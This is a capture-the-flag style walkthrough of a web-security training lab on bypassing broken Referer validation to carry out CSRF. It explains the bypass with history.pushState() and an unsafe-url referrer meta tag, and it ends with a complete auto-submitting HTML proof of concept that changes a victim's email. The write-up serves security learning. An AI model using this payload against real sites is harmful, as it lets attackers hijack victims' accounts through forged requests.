# CSRF with broken Referer validation

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

Update the email 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c4cea6d5-2dc5-4788-a3a5-cf1b7358304b/2024-02-27_15-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Z6CRLKE5%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221855Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDS3fRQeU9B%2FyucJGbJKYkcjUAi5V2z551YeQ7TGxgvkgIgXkmrWZl%2B6fsYyHV7fdFGQhf3ptUxmVjeO1k%2B9rVTC5sqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFqa3P3CvW5qiIQ%2B9CrcAzCpCkEVd2CIFnX0hHzVBidlTL5uEpEVYShRv7tA5RzkgG2L14ZBoRTYddErFlOCynO1SvRKLU2zRfTUP%2BFrNUk05QXhVYd%2FfJVbiwGoGHw3kFVWUYXmg5DavZXpHCsYQy1YXtVjdwOMrcG5vQp0vtLhdoVXoiH%2BOhqQiePbCSOonUCNJ7ru8xlW2ud0Tyf7fHHhPyP1LXNLKILQ37kaccAgzfxUnBvad2pzCIeiWXKw1GXLUUyDnfNOS7wZa5aDWKQuhUV0HDyjv6HvdtGs7%2FcpNWiC47IHNZfAM4t7PDnlZOx9%2FwqfBIGIEcZQg84eWWpotOKxMXLuPIPEbxjSJUU1Xa5X9CEi3HaBxYFEDESY%2F5njMM5NGCQckfp34%2FY0D%2FCpBJ9WROJcAsjWJLttiPtn1BkZySw8F9cpYxg4sL92qlNd8jslakYVeI%2B4TPm8G91XXIT0tmPpz7%2BSEbkMvMwV%2FYzCJgbNE87PBBKh96RPYTizR7jKlysyjt7g9o33MmAgBmZIyK6dh6zcqb%2F0WNGBqy4FTFhg6G0j7AlEaVtYTbalGKbp8pgPTlavclL%2FaEfsQF9NTjkdZ%2BIU1KyUrriVXZPnB3DIZ0LADBRqJmYeMzhiEoKo4A6o3vw%2BMKSEo9QGOqUBLwLnVxLUci%2FLHHsYjgZUJsUkemYiZbasLEng1MBr24DvgdkKTgW%2BTLdOYAiMeub8GkhkSp66HRITxYZgkWze4AN9MyZjRozRi2S%2FjgljSarxY8vuc2JUd4kqUxZeRHsrR%2Blk81BzYsvJQpozzX%2BACAa%2BVHEmthQP1IX%2FsVLk7n%2B0cJ7blKhcnp6nQMvloB%2B7wie93T8WePUgsQ83%2F%2FZkYTf7d7Ye&X-Amz-Signature=bf38ecf052e90b9a44b2e4427a991f11b542a3f86797387bbb387678b1f7cf4c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

> 💡 In order for a CSRF attack to be possible:

  - A relevant action: change a users email
  - Cookie-based session handling: session cookie
  - No unpredictable request parameters: no csrf token
**Generate CSRF PoC** (in prof. v.) or  
**craft a HTML form that performs CSRF attack to the victim:**

use the `exploit server` to test CSRF attack!

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/10ba55c1-6334-4b67-90ca-bbc7fb1d9293/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Z6CRLKE5%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221855Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDS3fRQeU9B%2FyucJGbJKYkcjUAi5V2z551YeQ7TGxgvkgIgXkmrWZl%2B6fsYyHV7fdFGQhf3ptUxmVjeO1k%2B9rVTC5sqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFqa3P3CvW5qiIQ%2B9CrcAzCpCkEVd2CIFnX0hHzVBidlTL5uEpEVYShRv7tA5RzkgG2L14ZBoRTYddErFlOCynO1SvRKLU2zRfTUP%2BFrNUk05QXhVYd%2FfJVbiwGoGHw3kFVWUYXmg5DavZXpHCsYQy1YXtVjdwOMrcG5vQp0vtLhdoVXoiH%2BOhqQiePbCSOonUCNJ7ru8xlW2ud0Tyf7fHHhPyP1LXNLKILQ37kaccAgzfxUnBvad2pzCIeiWXKw1GXLUUyDnfNOS7wZa5aDWKQuhUV0HDyjv6HvdtGs7%2FcpNWiC47IHNZfAM4t7PDnlZOx9%2FwqfBIGIEcZQg84eWWpotOKxMXLuPIPEbxjSJUU1Xa5X9CEi3HaBxYFEDESY%2F5njMM5NGCQckfp34%2FY0D%2FCpBJ9WROJcAsjWJLttiPtn1BkZySw8F9cpYxg4sL92qlNd8jslakYVeI%2B4TPm8G91XXIT0tmPpz7%2BSEbkMvMwV%2FYzCJgbNE87PBBKh96RPYTizR7jKlysyjt7g9o33MmAgBmZIyK6dh6zcqb%2F0WNGBqy4FTFhg6G0j7AlEaVtYTbalGKbp8pgPTlavclL%2FaEfsQF9NTjkdZ%2BIU1KyUrriVXZPnB3DIZ0LADBRqJmYeMzhiEoKo4A6o3vw%2BMKSEo9QGOqUBLwLnVxLUci%2FLHHsYjgZUJsUkemYiZbasLEng1MBr24DvgdkKTgW%2BTLdOYAiMeub8GkhkSp66HRITxYZgkWze4AN9MyZjRozRi2S%2FjgljSarxY8vuc2JUd4kqUxZeRHsrR%2Blk81BzYsvJQpozzX%2BACAa%2BVHEmthQP1IX%2FsVLk7n%2B0cJ7blKhcnp6nQMvloB%2B7wie93T8WePUgsQ83%2F%2FZkYTf7d7Ye&X-Amz-Signature=d2681fd21cc3846947256e92ed16a220b356bc6974371d49a1a7d8ed15fd4873&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/284bd78e-f50c-4407-a692-7550d0ba1fd0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Z6CRLKE5%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221855Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDS3fRQeU9B%2FyucJGbJKYkcjUAi5V2z551YeQ7TGxgvkgIgXkmrWZl%2B6fsYyHV7fdFGQhf3ptUxmVjeO1k%2B9rVTC5sqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFqa3P3CvW5qiIQ%2B9CrcAzCpCkEVd2CIFnX0hHzVBidlTL5uEpEVYShRv7tA5RzkgG2L14ZBoRTYddErFlOCynO1SvRKLU2zRfTUP%2BFrNUk05QXhVYd%2FfJVbiwGoGHw3kFVWUYXmg5DavZXpHCsYQy1YXtVjdwOMrcG5vQp0vtLhdoVXoiH%2BOhqQiePbCSOonUCNJ7ru8xlW2ud0Tyf7fHHhPyP1LXNLKILQ37kaccAgzfxUnBvad2pzCIeiWXKw1GXLUUyDnfNOS7wZa5aDWKQuhUV0HDyjv6HvdtGs7%2FcpNWiC47IHNZfAM4t7PDnlZOx9%2FwqfBIGIEcZQg84eWWpotOKxMXLuPIPEbxjSJUU1Xa5X9CEi3HaBxYFEDESY%2F5njMM5NGCQckfp34%2FY0D%2FCpBJ9WROJcAsjWJLttiPtn1BkZySw8F9cpYxg4sL92qlNd8jslakYVeI%2B4TPm8G91XXIT0tmPpz7%2BSEbkMvMwV%2FYzCJgbNE87PBBKh96RPYTizR7jKlysyjt7g9o33MmAgBmZIyK6dh6zcqb%2F0WNGBqy4FTFhg6G0j7AlEaVtYTbalGKbp8pgPTlavclL%2FaEfsQF9NTjkdZ%2BIU1KyUrriVXZPnB3DIZ0LADBRqJmYeMzhiEoKo4A6o3vw%2BMKSEo9QGOqUBLwLnVxLUci%2FLHHsYjgZUJsUkemYiZbasLEng1MBr24DvgdkKTgW%2BTLdOYAiMeub8GkhkSp66HRITxYZgkWze4AN9MyZjRozRi2S%2FjgljSarxY8vuc2JUd4kqUxZeRHsrR%2Blk81BzYsvJQpozzX%2BACAa%2BVHEmthQP1IX%2FsVLk7n%2B0cJ7blKhcnp6nQMvloB%2B7wie93T8WePUgsQ83%2F%2FZkYTf7d7Ye&X-Amz-Signature=309b781e46ece8f17189eee1a2cc2ddf9d982c62dc704fa88b4e6d3f293503ca&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/49d61922-5ef6-44ef-bd44-dce28f076652/2024-02-27_15-45.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Z6CRLKE5%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221855Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDS3fRQeU9B%2FyucJGbJKYkcjUAi5V2z551YeQ7TGxgvkgIgXkmrWZl%2B6fsYyHV7fdFGQhf3ptUxmVjeO1k%2B9rVTC5sqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFqa3P3CvW5qiIQ%2B9CrcAzCpCkEVd2CIFnX0hHzVBidlTL5uEpEVYShRv7tA5RzkgG2L14ZBoRTYddErFlOCynO1SvRKLU2zRfTUP%2BFrNUk05QXhVYd%2FfJVbiwGoGHw3kFVWUYXmg5DavZXpHCsYQy1YXtVjdwOMrcG5vQp0vtLhdoVXoiH%2BOhqQiePbCSOonUCNJ7ru8xlW2ud0Tyf7fHHhPyP1LXNLKILQ37kaccAgzfxUnBvad2pzCIeiWXKw1GXLUUyDnfNOS7wZa5aDWKQuhUV0HDyjv6HvdtGs7%2FcpNWiC47IHNZfAM4t7PDnlZOx9%2FwqfBIGIEcZQg84eWWpotOKxMXLuPIPEbxjSJUU1Xa5X9CEi3HaBxYFEDESY%2F5njMM5NGCQckfp34%2FY0D%2FCpBJ9WROJcAsjWJLttiPtn1BkZySw8F9cpYxg4sL92qlNd8jslakYVeI%2B4TPm8G91XXIT0tmPpz7%2BSEbkMvMwV%2FYzCJgbNE87PBBKh96RPYTizR7jKlysyjt7g9o33MmAgBmZIyK6dh6zcqb%2F0WNGBqy4FTFhg6G0j7AlEaVtYTbalGKbp8pgPTlavclL%2FaEfsQF9NTjkdZ%2BIU1KyUrriVXZPnB3DIZ0LADBRqJmYeMzhiEoKo4A6o3vw%2BMKSEo9QGOqUBLwLnVxLUci%2FLHHsYjgZUJsUkemYiZbasLEng1MBr24DvgdkKTgW%2BTLdOYAiMeub8GkhkSp66HRITxYZgkWze4AN9MyZjRozRi2S%2FjgljSarxY8vuc2JUd4kqUxZeRHsrR%2Blk81BzYsvJQpozzX%2BACAa%2BVHEmthQP1IX%2FsVLk7n%2B0cJ7blKhcnp6nQMvloB%2B7wie93T8WePUgsQ83%2F%2FZkYTf7d7Ye&X-Amz-Signature=83aeb34385be577cb740a845833f7e9f4fa5420c56293f0d691f3d0e2bc5b7bc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Since the `Referer` HTTP header can be fully controlled by the attacker, we can bypass this check!

send this request into Repeater 

> 💡 Testing Referer header for CSRF attacks:

  1. Remove the Referer header
  1. Check which portion of the referrer header is the application validating

1. Remove the Referer header

It still gives the same error "Invalid referer header”

1. Check which portion of the referrer header is the application validating

Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. 

The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string. 

> 💡 **According the **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/API/History/pushState)**, we can use a JavaScript function called **`history.pushState()`**:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054430.png)

To bypass that check, we can add the `history.pushState()` function in our exploit:

This will cause the `Referer` header in the generated request to contain the URL of the target site in the query string.

However, this still couldn’t work, as many browsers now strip the query string from the Referer header by default as a security measure.

**To bypass that, we can just add a new **`<meta>`** tag to override that behavior and ensure that the full URL is included in the request:**

> 💡 Fortunately, the documentation regarding referrer-policy on [mozilla.org](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) shows the solution:

![](https://github.com/frank-leitner/portswigger-websecurity-academy/raw/main/12_cross_site_request_forgery_CSRF/CSRF_with_broken_Referer_validation/img/referrer_policy_docu.png)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/b5868926-f66b-4b83-ab9f-7695e5f2d4bb/2024-02-27_17-27.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Z6CRLKE5%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221855Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDS3fRQeU9B%2FyucJGbJKYkcjUAi5V2z551YeQ7TGxgvkgIgXkmrWZl%2B6fsYyHV7fdFGQhf3ptUxmVjeO1k%2B9rVTC5sqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFqa3P3CvW5qiIQ%2B9CrcAzCpCkEVd2CIFnX0hHzVBidlTL5uEpEVYShRv7tA5RzkgG2L14ZBoRTYddErFlOCynO1SvRKLU2zRfTUP%2BFrNUk05QXhVYd%2FfJVbiwGoGHw3kFVWUYXmg5DavZXpHCsYQy1YXtVjdwOMrcG5vQp0vtLhdoVXoiH%2BOhqQiePbCSOonUCNJ7ru8xlW2ud0Tyf7fHHhPyP1LXNLKILQ37kaccAgzfxUnBvad2pzCIeiWXKw1GXLUUyDnfNOS7wZa5aDWKQuhUV0HDyjv6HvdtGs7%2FcpNWiC47IHNZfAM4t7PDnlZOx9%2FwqfBIGIEcZQg84eWWpotOKxMXLuPIPEbxjSJUU1Xa5X9CEi3HaBxYFEDESY%2F5njMM5NGCQckfp34%2FY0D%2FCpBJ9WROJcAsjWJLttiPtn1BkZySw8F9cpYxg4sL92qlNd8jslakYVeI%2B4TPm8G91XXIT0tmPpz7%2BSEbkMvMwV%2FYzCJgbNE87PBBKh96RPYTizR7jKlysyjt7g9o33MmAgBmZIyK6dh6zcqb%2F0WNGBqy4FTFhg6G0j7AlEaVtYTbalGKbp8pgPTlavclL%2FaEfsQF9NTjkdZ%2BIU1KyUrriVXZPnB3DIZ0LADBRqJmYeMzhiEoKo4A6o3vw%2BMKSEo9QGOqUBLwLnVxLUci%2FLHHsYjgZUJsUkemYiZbasLEng1MBr24DvgdkKTgW%2BTLdOYAiMeub8GkhkSp66HRITxYZgkWze4AN9MyZjRozRi2S%2FjgljSarxY8vuc2JUd4kqUxZeRHsrR%2Blk81BzYsvJQpozzX%2BACAa%2BVHEmthQP1IX%2FsVLk7n%2B0cJ7blKhcnp6nQMvloB%2B7wie93T8WePUgsQ83%2F%2FZkYTf7d7Ye&X-Amz-Signature=1bcced8652fa02d5f0b12929d296c0974e1294cf047a7b453ffc2b99421c182f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <head>
        <meta name="referrer" content="unsafe-url">
    </head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ab4004803380574938c5dbf00e200fa.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0ab4004803380574938c5dbf00e200fa.web-security-academy.net/my-account');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
